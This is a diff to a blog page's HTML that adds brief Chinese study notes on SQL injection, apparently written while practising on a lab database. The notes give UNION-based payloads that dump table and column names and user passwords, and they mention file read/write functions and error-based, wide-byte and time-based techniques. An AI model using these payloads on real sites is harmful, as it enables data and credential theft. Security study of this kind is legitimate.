@@ -574,7 +574,10 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <p>?id&#x3D;1 and 1&#x3D;1<br>当?id&#x3D;1   id&#x3D;2   id&#x3D;5   出现正常回显，？id&#x3D;1’时出现报错说明此时有注入点<br>?id&#x3D;1’ and 1&#x3D;2<br>?id&#x3D;1  order by  4–+<br>?id&#x3D;1’ union select by 1,2,3–+<br>?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’–+<br>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’–+<br>?id&#x3D;-1’ union select 1,group_concat(username,password),3 from users–+</p>
+<p>mysql函数：load_file()读取文件操作<br>          into outfile 写文件操作</p>
+<p>mysql不能转换报错但是可以利用函数 updatexml  floor函数<br>宽字节注入<br>长字符截断<br>延时注入</p>
+
                 
             </div>
             <hr/>
